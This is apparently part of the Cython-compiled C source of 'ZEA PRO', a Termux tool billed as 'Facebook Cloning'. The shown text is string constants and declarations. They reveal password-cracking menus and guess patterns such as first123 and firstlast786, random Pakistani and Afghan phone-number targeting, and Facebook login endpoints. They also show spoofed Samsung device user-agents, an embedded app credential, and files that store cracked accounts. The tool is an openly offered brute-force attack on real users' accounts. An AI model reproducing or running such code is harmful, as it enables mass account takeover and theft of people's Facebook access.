static const char __pyx_k_GT_P5110_JDQ39[] = "GT-P5110|JDQ39";
static const char __pyx_k_GT_P5220_JDQ39[] = "GT-P5220|JDQ39";
static const char __pyx_k_GT_S5670HKBZTA[] = "GT-S5670HKBZTA";
static const char __pyx_k_GT_S6010BBABTU[] = "GT-S6010BBABTU";
static const char __pyx_k_GT_S6310ZWAMID[] = "GT-S6310ZWAMID";
static const char __pyx_k_GT_S6800HKAXFA[] = "GT-S6800HKAXFA";
static const char __pyx_k_GT_S6810MBASER[] = "GT-S6810MBASER";
static const char __pyx_k_GT_S7500ABABTU[] = "GT-S7500ABABTU";
static const char __pyx_k_GT_S7500ABADBT[] = "GT-S7500ABADBT";
static const char __pyx_k_GT_S7500ABTTLP[] = "GT-S7500ABTTLP";
static const char __pyx_k_GT_S7500CWADBT[] = "GT-S7500CWADBT";
static const char __pyx_k_Getting_gmails[] = " Getting gmails...";
static const char __pyx_k_Login_approval[] = "Login approval";
static const char __pyx_k_Put_first_name[] = " Put first name: ";
static const char __pyx_k_SM_J510FN_NMF2[] = "SM-J510FN|NMF2";
static const char __pyx_k_SM_T230_KOT49H[] = "SM-T230|KOT49H";
static const char __pyx_k_SM_T231_KOT49H[] = "SM-T231|KOT49H";
static const char __pyx_k_SM_T310_KOT49H[] = "SM-T310|KOT49H";
static const char __pyx_k_SM_T311_KOT49H[] = "SM-T311|KOT49H";
static const char __pyx_k_SM_T525_KOT49H[] = "SM-T525|KOT49H";
static const char __pyx_k_SM_T531_KOT49H[] = "SM-T531|KOT49H";
static const char __pyx_k_SM_T531_LRX22G[] = "SM-T531|LRX22G";
static const char __pyx_k_SM_T535_LRX22G[] = "SM-T535|LRX22G";
static const char __pyx_k_SM_T555_LRX22G[] = "SM-T555|LRX22G";
static const char __pyx_k_SM_T561_KTU84P[] = "SM-T561|KTU84P";
static const char __pyx_k_SM_T705_LRX22G[] = "SM-T705|LRX22G";
static const char __pyx_k_SM_T805_LRX22G[] = "SM-T805|LRX22G";
static const char __pyx_k_SM_T820_NRD90M[] = "SM-T820|NRD90M";
static const char __pyx_k_Thanks_for_use[] = " Thanks for use \303\260\305\270\342\200\230\305\222\303\260\305\270\313\234\305\223 ";
static const char __pyx_k_Total_OK_CP_2F[] = " Total OK/CP/2F: ";
static const char __pyx_k_en_US_en_q_0_9[] = "en-US,en;q=0.9";
static const char __pyx_k_enroll_misauth[] = "enroll_misauth";
static const char __pyx_k_name_lsd_value[] = "name=\"lsd\" value=\"(.*?)\"";
static const char __pyx_k_p_facebook_com[] = "p.facebook.com";
static const char __pyx_k_sec_fetch_dest[] = "sec-fetch-dest";
static const char __pyx_k_sec_fetch_mode[] = "sec-fetch-mode";
static const char __pyx_k_sec_fetch_site[] = "sec-fetch-site";
static const char __pyx_k_sec_fetch_user[] = "sec-fetch-user";
static const char __pyx_k_viewport_width[] = "viewport-width";
static const char __pyx_k_Accept_Encoding[] = "Accept-Encoding";
static const char __pyx_k_ConnectionError[] = "ConnectionError";
static const char __pyx_k_Enter_your_Name[] = " Enter your Name : ";
static const char __pyx_k_GT_I9190_KOT49H[] = "GT-I9190|KOT49H";
static const char __pyx_k_GT_I9192_KOT49H[] = "GT-I9192|KOT49H";
static const char __pyx_k_GT_I9300_IMM76D[] = "GT-I9300|IMM76D";
static const char __pyx_k_GT_I9300_JSS15J[] = "GT-I9300|JSS15J";
static const char __pyx_k_GT_I9500_LRX22C[] = "GT-I9500|LRX22C";
static const char __pyx_k_GT_N5100_JZO54K[] = "GT-N5100|JZO54K";
static const char __pyx_k_GT_N7100_KOT49H[] = "GT-N7100|KOT49H";
static const char __pyx_k_GT_N8000_JZO54K[] = "GT-N8000|JZO54K";
static const char __pyx_k_GT_N8000_KOT49H[] = "GT-N8000|KOT49H";
static const char __pyx_k_GT_P3110_JZO54K[] = "GT-P3110|JZO54K";
static const char __pyx_k_GT_P5100_IML74K[] = "GT-P5100|IML74K";
static const char __pyx_k_GT_P5100_JZO54K[] = "GT-P5100|JZO54K";
static const char __pyx_k_GT_P5200_KOT49H[] = "GT-P5200|KOT49H";
static const char __pyx_k_GT_P5210_KOT49H[] = "GT-P5210|KOT49H";
static const char __pyx_k_GT_S7390_JZO54K[] = "GT-S7390|JZO54K";
static const char __pyx_k_SM_A500F_LRX22G[] = "SM-A500F|LRX22G";
static const char __pyx_k_SM_A500F_MMB29M[] = "SM-A500F|MMB29M";
static const char __pyx_k_SM_A500H_MMB29M[] = "SM-A500H|MMB29M";
static const char __pyx_k_SM_G900F_KOT49H[] = "SM-G900F|KOT49H";
static const char __pyx_k_SM_G920F_MMB29K[] = "SM-G920F|MMB29K";
static const char __pyx_k_SM_G920F_NRD90M[] = "SM-G920F|NRD90M";
static const char __pyx_k_SM_G930F_NRD90M[] = "SM-G930F|NRD90M";
static const char __pyx_k_SM_G935F_MMB29K[] = "SM-G935F|MMB29K";
static const char __pyx_k_SM_G935F_NRD90M[] = "SM-G935F|NRD90M";
static const char __pyx_k_SM_G950F_NRD90M[] = "SM-G950F|NRD90M";
static const char __pyx_k_SM_J320F_LMY47V[] = "SM-J320F|LMY47V";
static const char __pyx_k_SM_J320H_LMY47V[] = "SM-J320H|LMY47V";
static const char __pyx_k_SM_J320M_LMY47V[] = "SM-J320M|LMY47V";
static const char __pyx_k_SM_J701F_NRD90M[] = "SM-J701F|NRD90M;";
static const char __pyx_k_SPH_L720_KOT49H[] = "SPH-L720|KOT49H";
static const char __pyx_k_accept_encoding[] = "accept-encoding";
static const char __pyx_k_accept_language[] = "accept-language";
static const char __pyx_k_allow_redirects[] = "allow_redirects";
static const char __pyx_k_android_version[] = "android_version";
static const char __pyx_k_en_US_FB4A_FBAV[] = ";en_US;FB4A;FBAV/";
static const char __pyx_k_gzip_deflate_br[] = "gzip, deflate, br";
static const char __pyx_k_meta_inf_fbmeta[] = "meta_inf_fbmeta";
static const char __pyx_k_python_AKING_py[] = "python AKING.py";
static const char __pyx_k_1_32m_ZEA_OK_s_s[] = "\r\r\033[1;32m [ZEA-OK] %s | %s";
static const char __pyx_k_Choose_an_option[] = " Choose an option: ";
static const char __pyx_k_GT_7550_5GT_8005[] = "GT-7550   5GT-8005";
static const char __pyx_k_GT_I9300I_KTU84P[] = "GT-I9300I|KTU84P";
static const char __pyx_k_GT_I9301I_KOT49H[] = "GT-I9301I|KOT49H";
static const char __pyx_k_SM_A500FU_MMB29M[] = "SM-A500FU|MMB29M";
static const char __pyx_k_SM_J320FN_LMY47V[] = "SM-J320FN|LMY47V";
static const char __pyx_k_SM_J510FN_MMB29M[] = "SM-J510FN|MMB29M";
static const char __pyx_k_SM_J510FN_NMF26X[] = "SM-J510FN|NMF26X";
static const char __pyx_k_SM_T705_LRX22G_2[] = "SM-T705|LRX22G;";
static const char __pyx_k_X_FB_HTTP_Engine[] = "X-FB-HTTP-Engine";
static const char __pyx_k_credentials_type[] = "credentials_type";
static const char __pyx_k_family_device_id[] = "family_device_id";
static const char __pyx_k_sec_ch_ua_mobile[] = "sec-ch-ua-mobile";
static const char __pyx_k_www_facebook_com[] = "www.facebook.com";
static const char __pyx_k_FileNotFoundError[] = "FileNotFoundError";
static const char __pyx_k_Run_python_ZEA_py[] = " Run :  python ZEA.py";
static const char __pyx_k_SM_J701F_NRD90M_2[] = "SM-J701F|NRD90M";
static const char __pyx_k_bd_locals_genexpr[] = "bd.<locals>.genexpr";
static const char __pyx_k_com_facebook_lite[] = "com.facebook.lite";
static const char __pyx_k_com_facebook_orca[] = "com.facebook.orca";
static const char __pyx_k_error_detail_type[] = "error_detail_type";
static const char __pyx_k_sdcard_ZEA_CP_txt[] = "/sdcard/ZEA-CP.txt";
static const char __pyx_k_sdcard_ZEA_OK_txt[] = "/sdcard/ZEA-OK.txt";
static const char __pyx_k_SM_J510FN_NMF26X_2[] = "SM-J510FN|NMF26X;";
static const char __pyx_k_ThreadPoolExecutor[] = "ThreadPoolExecutor";
static const char __pyx_k_X_FB_Friendly_Name[] = "X-FB-Friendly-Name";
static const char __pyx_k_api_locals_genexpr[] = "api.<locals>.genexpr";
static const char __pyx_k_asyncio_coroutines[] = "asyncio.coroutines";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_com_facebook_mlite[] = "com.facebook.mlite";
static const char __pyx_k_concurrent_futures[] = "concurrent.futures";
static const char __pyx_k_name_jazoest_value[] = "name=\"jazoest\" value=\"(.*?)\"";
static const char __pyx_k_pak_locals_genexpr[] = "pak.<locals>.genexpr";
static const char __pyx_k_sec_ch_ua_platform[] = "sec-ch-ua-platform";
static const char __pyx_k_Mobile_Safari_533_1[] = "Mobile Safari/533.1";
static const char __pyx_k_ModuleNotFoundError[] = "ModuleNotFoundError";
static const char __pyx_k_Press_enter_to_back[] = " Press enter to back ";
static const char __pyx_k_Put_file_path_1_37m[] = " Put file path\033[1;37m: ";
static const char __pyx_k_Total_account_1_32m[] = " Total account : \033[1;32m";
static const char __pyx_k_Total_account_1_37m[] = " Total account : \033[1;37m";
static const char __pyx_k_api1_locals_genexpr[] = "api1.<locals>.genexpr";
static const char __pyx_k_client_country_code[] = "client_country_code";
static const char __pyx_k_com_facebook_katana[] = "com.facebook.katana";
static const char __pyx_k_generate_machine_id[] = "generate_machine_id";
static const char __pyx_k_rndm_locals_genexpr[] = "rndm.<locals>.genexpr";
static const char __pyx_k_sdcard_ZEA_R_CP_txt[] = "/sdcard/ZEA-R-CP.txt";
static const char __pyx_k_sdcard_ZEA_R_OK_txt[] = "/sdcard/ZEA-R-OK.txt";
static const char __pyx_k_Mobile_Safari_537_36[] = "Mobile Safari/537.36";
static const char __pyx_k_X_FB_Connection_Type[] = "X-FB-Connection-Type";
static const char __pyx_k_button_with_disabled[] = "button_with_disabled";
static const char __pyx_k_gmail_locals_genexpr[] = "gmail.<locals>.genexpr";
static const char __pyx_k_1_31m_First_Read_Note[] = "\033[1;31m First Read Note : ";
static const char __pyx_k_Dsj9JMWoixk4Qsje0Ng3nA[] = "Dsj9JMWoixk4Qsje0Ng3nA";
static const char __pyx_k_No_internet_connection[] = "\n No internet connection ...";
static const char __pyx_k_Tools_Facebook_Cloning[] = " Tools.. : Facebook Cloning";
static const char __pyx_k_1_37m_Choice_code_1_32m[] = "\033[1;37m Choice code  :\033[1;32m ";
static const char __pyx_k_File_location_not_found[] = " File location not found ";
static const char __pyx_k_Total_account_ids_1_32m[] = " Total account ids : \033[1;32m";
static const char __pyx_k_com_facebook_adsmanager[] = "com.facebook.adsmanager";
static const char __pyx_k_Option_not_found_in_menu[] = " Option not found in menu...";
static const char __pyx_k_Press_enter_to_back_menu[] = " Press enter to back menu ";
static const char __pyx_k_fb_api_req_friendly_name[] = "fb_api_req_friendly_name";
static const char __pyx_k_generate_session_cookies[] = "generate_session_cookies";
static const char __pyx_k_1_37m_Choice_code_1_32m_2[] = "\033[1;37m Choice code ..:\033[1;32m ";
static const char __pyx_k_The_process_has_completed[] = " The process has completed";
static const char __pyx_k_X_FB_Connection_Bandwidth[] = "X-FB-Connection-Bandwidth";
static const char __pyx_k_generate_analytics_claims[] = "generate_analytics_claims";
static const char __pyx_k_upgrade_insecure_requests[] = "upgrade-insecure-requests";
static const char __pyx_k_1_Method_2_Method_3_Method[] = " [1] Method \n [2] Method \n [3] Method ";
static const char __pyx_k_Installing_missing_modules[] = "\n Installing missing modules ...";
static const char __pyx_k_Select_Password_Crack_menu[] = " Select Password Crack menu";
static const char __pyx_k_currently_logged_in_userid[] = "currently_logged_in_userid";
static const char __pyx_k_Davik_2_1_0_Linux_U_Android[] = "Davik/2.1.0 (Linux; U; Android ";
static const char __pyx_k_Mozilla_5_0_Linux_U_Android[] = "Mozilla/5.0 (Linux; U; Android";
static const char __pyx_k_sec_ch_prefers_color_scheme[] = "sec-ch-prefers-color-scheme";
static const char __pyx_k_Your_Subscription_Date_Expire[] = " Your Subscription Date Expire";
static const char __pyx_k_1_31mTrail_Time_Has_Been_Ended[] = " \033[1;31mTrail Time Has Been Ended ....";
static const char __pyx_k_1_31mYour_Key_Not_Registered_1[] = " \033[1;31mYour Key Not Registered\033[1;37m";
static const char __pyx_k_1_33m_Code_example_077_078_070[] = "\033[1;33m Code example: 077,078,070,079,076";
static const char __pyx_k_1_37m_38_5_208mUse_flight_mode[] = "\033[1;37m \033[38;5;208mUse flight mode for speed up\033[1;37m";
static const char __pyx_k_1_37m_example_khan_ahmad_ali_1[] = "\033[1;37m example: khan, ahmad, ali \033[1;97m";
static const char __pyx_k_1_File_cloning_2_Random_number[] = " [1] File cloning\n [2] Random number cloning\n [3] WhatsApp Group (join)\n [0] Exit menu";
static const char __pyx_k_How_many_passwords_do_you_want[] = " How many passwords do you want to add ? ";
static const char __pyx_k_1_31m_Your_Not_Premium_User_1_3[] = "\033[1;31m Your Not Premium User...!\033[1;37m";
static const char __pyx_k_1_32mWorking_password_for_Pakis[] = " \033[1;32mWorking password for Pakistan\033[1;37m ";
static const char __pyx_k_1_32m_Out_of_Pakistan_working_p[] = "\033[1;32m Out of Pakistan working password\033[1;37m ";
static const char __pyx_k_1_32m_exp_first123_last123_firs[] = "\033[1;32m exp: first123 last123 firstlast ";
static const char __pyx_k_1_32mfor_new_ids_use_just_1_pas[] = " \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last";
static const char __pyx_k_1_33m_Code_example_0306_0315_03[] = "\033[1;33m Code example: 0306,0315,0335,0345";
static const char __pyx_k_1_33m_example_2000_3000_5000_10[] = "\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: ";
static const char __pyx_k_1_36m_We_Not_Responsible_if_fac[] = "\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m";
static const char __pyx_k_1_37m_ZEA_R_M1_s_1_37mOK_s_1_37[] = "\r\r\033[1;37m [ZEA-R-M1] %s|\033[1;37mOK:-%s \033[1;37m";
static const char __pyx_k_1_37m_ZEA_XD_M1_s_1_37mOK_s_1_3[] = "\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m";
static const char __pyx_k_1_37m_ZEA_XD_M2_s_1_37mOK_s_1_3[] = "\r\r\033[1;37m [ZEA-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m";
static const char __pyx_k_1_37m_ZEA_XD_M3_s_1_37mOK_s_1_3[] = "\r\r\033[1;37m [ZEA-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m";
static const char __pyx_k_1_37m_example_muhammad_ali_sajj[] = "\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m";
static const char __pyx_k_1_37m_install_modules_It_will_t[] = "\n\033[1;37m install modules...\n It will take some seconds...";
static const char __pyx_k_1_93m_Please_Wait_Cloning_start[] = "\033[1;93m Please Wait Cloning started...";
static const char __pyx_k_1_95m_Use_flight_mode_for_speed[] = "\033[1;95m Use flight mode for speed up\033[1;37m";
static const char __pyx_k_1_Afghanistan_cloning_2_Pakista[] = " [1] Afghanistan cloning\n [2] Pakistan cloning\n [3] Gmail cloning\n [0] Back menu";
static const char __pyx_k_1_Crack_with_auto_password_2_Cr[] = " [1] Crack with auto password \n [2] Crack with choice password";
static const char __pyx_k_1_first_last_2_firstlast_3_firs[] = " [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110";
static const char __pyx_k_Do_you_went_show_cp_account_y_n[] = " Do you went show cp account? (y/n): ";
static const char __pyx_k_Example_gmail_com_yahoo_com_etc[] = " Example: @gmail.com , @yahoo.com etc...";
static const char __pyx_k_FBDM_density_2_625_width_1080_h[] = ";FBDM/{density=2.625,width=1080,height=1920};FBLC/";
static const char __pyx_k_File_crack_Create_ids_file_Publ[] = " [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\033[1;97m [1] Upgrade Tool To (\033[1;95mPremium\033[1;37m)";
static const char __pyx_k_Massage_Your_Key_Not_Registered[] = " Massage : Your Key Not Registered";
static const char __pyx_k_Mozilla_5_0_Linux_Android_6_0_1[] = "Mozilla/5.0 (Linux; Android 6.0.1;";
static const char __pyx_k_Not_A_Brand_v_99_Chromium_v_100[] = "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"";
static const char __pyx_k_Put_file_example_sdcard_File_tx[] = " Put file example:  /sdcard/File.txt ";
static const char __pyx_k_Status_1_91mTrail_1_37m_1_31m_1[] = " Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m";
static const char __pyx_k_Try_method_2_3_for_best_results[] = " Try method 2 & 3 for best results  ";
static const char __pyx_k_density_4_0_width_1440_height_3[] = ";{density=4.0,width=1440,height=3120};FBLC/en_US;FBRV/";
static const char __pyx_k_flow_login_no_pin_refsrc_deprec[] = "&flow=login_no_pin&refsrc=deprecated&_rdr";
static const char __pyx_k_https_b_api_facebook_com_method[] = "https://b-api.facebook.com/method/auth.login";
static const char __pyx_k_https_b_graph_facebook_com_auth[] = "https://b-graph.facebook.com/auth/login";
static const char __pyx_k_text_html_application_xhtml_xml[] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
static const char __pyx_k_xdg_open_https_www_facebook_com[] = "xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl";
static const char __pyx_k_350685531728_62f8ce9f74b12f84c12[] = "350685531728|62f8ce9f74b12f84c123cc23437a4a32";
static const char __pyx_k_AppleWebKit_537_36_KHTML_like_Ge[] = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/";
static const char __pyx_k_Hi_ZEA_Sir_I_Need_To_Buy_Your_Pa[] = "Hi ZEA Sir, I Need To Buy Your Paid ZEA PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- ";
static const char __pyx_k_application_x_www_form_urlencode[] = "application/x-www-form-urlencoded";
static const char __pyx_k_en_us_10_T_Mobile_myTouch_3G_Sli[] = "en-us; 10; T-Mobile myTouch 3G Slide Build/";
static const char __pyx_k_https_api_whatsapp_com_send_phon[] = "https://api.whatsapp.com/send?phone=+923150665740&text=";
static const char __pyx_k_https_free_facebook_com_login_sa[] = "https://free.facebook.com/login/save-device/";
static const char __pyx_k_https_p_facebook_com_login_devic[] = "https://p.facebook.com/login/device-based/password/?uid=";
static const char __pyx_k_pip_install_requests_futures_2_d[] = "pip install requests futures==2 > /dev/null";
static const char __pyx_k_xdg_open_https_chat_whatsapp_com[] = "xdg-open https://chat.whatsapp.com/";
static const char __pyx_k_xdg_open_https_facebook_com_grou[] = "xdg-open https://facebook.com/groups/351076900316263/";
static const char __pyx_k_1_first_last_2_firstlast_3_firs_2[] = " [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ";
static const char __pyx_k_density_4_0_width_1440_height_3_2[] = ";{density=4.0,width=1440,height=3127};FBLC/en_US;FBRV/";
static const char __pyx_k_AppleWebKit_537_36_KHTML_like_Ge_2[] = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99";
static const char __pyx_k_https_p_facebook_com_login_devic_2[] = "https://p.facebook.com/login/device-based/validate-password/?shbl=0";
static const char __pyx_k_xdg_open_https_chat_whatsapp_com_2[] = "xdg-open https://chat.whatsapp.com/CDmx5nuZu1iAmV0J4HlVyG";
/* #### Code section: decls ### */
static PyObject *__pyx_pf_3krk_linex(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_2clear(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_4menu(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_3pak_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_6pak(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_2bd_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_8bd(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_5gmail_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_5gmail_3genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_10gmail(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_12ffb(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist); /* proto */
static PyObject *__pyx_pf_3krk_3api_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_14api(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist); /* proto */
static PyObject *__pyx_pf_3krk_4api1_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_16api1(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist); /* proto */
static PyObject *__pyx_pf_3krk_4rndm_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_3krk_18rndm(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_passlist); /* proto */
static PyObject *__pyx_tp_new_3krk___pyx_scope_struct__genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_1_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_2_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_3_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_4_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_5_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_6_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
/* #### Code section: late_includes ### */
/* #### Code section: module_state ### */
typedef struct {
  PyObject *__pyx_d;
  PyObject *__pyx_b;
  PyObject *__pyx_cython_runtime;
  PyObject *__pyx_empty_tuple;
  PyObject *__pyx_empty_bytes;
  PyObject *__pyx_empty_unicode;
  #ifdef __Pyx_CyFunction_USED
  PyTypeObject *__pyx_CyFunctionType;
  #endif
  #ifdef __Pyx_FusedFunction_USED
  PyTypeObject *__pyx_FusedFunctionType;
  #endif
  #ifdef __Pyx_Generator_USED
  PyTypeObject *__pyx_GeneratorType;
  #endif
  #ifdef __Pyx_IterableCoroutine_USED
  PyTypeObject *__pyx_IterableCoroutineType;
  #endif
  #ifdef __Pyx_Coroutine_USED
  PyTypeObject *__pyx_CoroutineAwaitType;
  #endif
  #ifdef __Pyx_Coroutine_USED
  PyTypeObject *__pyx_CoroutineType;
  #endif
  #if CYTHON_USE_MODULE_STATE
  PyObject *__pyx_type_3krk___pyx_scope_struct__genexpr;
  PyObject *__pyx_type_3krk___pyx_scope_struct_1_genexpr;
  PyObject *__pyx_type_3krk___pyx_scope_struct_2_genexpr;
  PyObject *__pyx_type_3krk___pyx_scope_struct_3_genexpr;
  PyObject *__pyx_type_3krk___pyx_scope_struct_4_genexpr;
  PyObject *__pyx_type_3krk___pyx_scope_struct_5_genexpr;
  PyObject *__pyx_type_3krk___pyx_scope_struct_6_genexpr;
  #endif
  PyTypeObject *__pyx_ptype_3krk___pyx_scope_struct__genexpr;
  PyTypeObject *__pyx_ptype_3krk___pyx_scope_struct_1_genexpr;
  PyTypeObject *__pyx_ptype_3krk___pyx_scope_struct_2_genexpr;
  PyTypeObject *__pyx_ptype_3krk___pyx_scope_struct_3_genexpr;
  PyTypeObject *__pyx_ptype_3krk___pyx_scope_struct_4_genexpr;
  PyTypeObject *__pyx_ptype_3krk___pyx_scope_struct_5_genexpr;
  PyTypeObject *__pyx_ptype_3krk___pyx_scope_struct_6_genexpr;
  PyObject *__pyx_kp_s_0;
  PyObject *__pyx_kp_s_00;
  PyObject *__pyx_kp_s_01;
  PyObject *__pyx_kp_s_02;
  PyObject *__pyx_kp_s_03;
  PyObject *__pyx_kp_s_04;
  PyObject *__pyx_kp_s_05;
  PyObject *__pyx_kp_s_06;
  PyObject *__pyx_kp_s_08;
  PyObject *__pyx_kp_u_0_0;
  PyObject *__pyx_kp_s_0_1;
  PyObject *__pyx_kp_s_1;
  PyObject *__pyx_kp_s_10;
  PyObject *__pyx_kp_s_11;
  PyObject *__pyx_kp_s_1122;
  PyObject *__pyx_kp_s_12;
  PyObject *__pyx_kp_s_123;
  PyObject *__pyx_kp_s_1234;
  PyObject *__pyx_kp_s_12345;
  PyObject *__pyx_kp_s_13;
  PyObject *__pyx_kp_s_1_2;
  PyObject *__pyx_kp_s_1_31mTrail_Time_Has_Been_Ended;
  PyObject *__pyx_kp_s_1_31mYour_Key_Not_Registered_1;
  PyObject *__pyx_kp_s_1_31m_First_Read_Note;
  PyObject *__pyx_kp_s_1_31m_Your_Not_Premium_User_1_3;
  PyObject *__pyx_kp_s_1_32m;
  PyObject *__pyx_kp_s_1_32mWorking_password_for_Pakis;
  PyObject *__pyx_kp_s_1_32m_Out_of_Pakistan_working_p;
  PyObject *__pyx_kp_s_1_32m_ZEA_OK;
  PyObject *__pyx_kp_s_1_32m_ZEA_OK_s_s;
  PyObject *__pyx_kp_s_1_32m_exp_first123_last123_firs;
  PyObject *__pyx_kp_s_1_32mfor_new_ids_use_just_1_pas;
  PyObject *__pyx_kp_s_1_33m_Code_example_0306_0315_03;
  PyObject *__pyx_kp_s_1_33m_Code_example_077_078_070;
  PyObject *__pyx_kp_s_1_33m_ZEA_2F;
  PyObject *__pyx_kp_s_1_33m_example_2000_3000_5000_10;
  PyObject *__pyx_kp_s_1_34m_ZEA_2F;
  PyObject *__pyx_kp_s_1_36m_We_Not_Responsible_if_fac;
  PyObject *__pyx_kp_s_1_36m_ZEA_CP;
  PyObject *__pyx_kp_s_1_37m;
  PyObject *__pyx_kp_u_1_37mYour_Key;
  PyObject *__pyx_kp_s_1_37m_2;
  PyObject *__pyx_kp_s_1_37m_38_5_208mUse_flight_mode;
  PyObject *__pyx_kp_u_1_37m_Choice_code_1_32m;
  PyObject *__pyx_kp_u_1_37m_Choice_code_1_32m_2;
  PyObject *__pyx_kp_s_1_37m_ZEA_R_M1_s_1_37mOK_s_1_37;
  PyObject *__pyx_kp_s_1_37m_ZEA_XD_M1_s_1_37mOK_s_1_3;
  PyObject *__pyx_kp_s_1_37m_ZEA_XD_M2_s_1_37mOK_s_1_3;
  PyObject *__pyx_kp_s_1_37m_ZEA_XD_M3_s_1_37mOK_s_1_3;
  PyObject *__pyx_kp_s_1_37m_example_khan_ahmad_ali_1;
  PyObject *__pyx_kp_s_1_37m_example_muhammad_ali_sajj;
  PyObject *__pyx_kp_s_1_37m_install_modules_It_will_t;
  PyObject *__pyx_kp_s_1_37m_put_code;
  PyObject *__pyx_kp_s_1_93m_Please_Wait_Cloning_start;
  PyObject *__pyx_kp_s_1_95m_Use_flight_mode_for_speed;
  PyObject *__pyx_kp_s_1_97m;
  PyObject *__pyx_kp_s_1_Afghanistan_cloning_2_Pakista;
  PyObject *__pyx_kp_s_1_Crack_with_auto_password_2_Cr;
  PyObject *__pyx_kp_s_1_File_cloning_2_Random_number;
  PyObject *__pyx_kp_s_1_Method_2_Method_3_Method;
  PyObject *__pyx_kp_s_1_first_last_2_firstlast_3_firs;
  PyObject *__pyx_kp_s_1_first_last_2_firstlast_3_firs_2;
  PyObject *__pyx_kp_s_2;
  PyObject *__pyx_kp_s_210;
  PyObject *__pyx_kp_s_28;
  PyObject *__pyx_kp_s_29;
  PyObject *__pyx_kp_s_3;
  PyObject *__pyx_kp_s_350685531728_62f8ce9f74b12f84c12;
  PyObject *__pyx_kp_s_4;
  PyObject *__pyx_kp_s_5;
  PyObject *__pyx_kp_s_6;
  PyObject *__pyx_kp_s_7;
  PyObject *__pyx_kp_s_786;
  PyObject *__pyx_kp_s_8;
  PyObject *__pyx_kp_s_9;
  PyObject *__pyx_kp_s_980;
  PyObject *__pyx_kp_s_9_0_1;
  PyObject *__pyx_kp_s_9_FBOP_1_FBCA;
  PyObject *__pyx_n_s_A;
  PyObject *__pyx_kp_s_Accept_Encoding;
  PyObject *__pyx_n_s_Afghan123;
  PyObject *__pyx_n_s_Afghan1234;
  PyObject *__pyx_n_s_Afghan12345;
  PyObject *__pyx_n_s_Android;
  PyObject *__pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge;
  PyObject *__pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge_2;
  PyObject *__pyx_n_s_Authorization;
  PyObject *__pyx_n_s_B;
  PyObject *__pyx_kp_s_Build;
  PyObject *__pyx_n_s_C;
  PyObject *__pyx_kp_s_Choose;
  PyObject *__pyx_kp_s_Choose_Option;
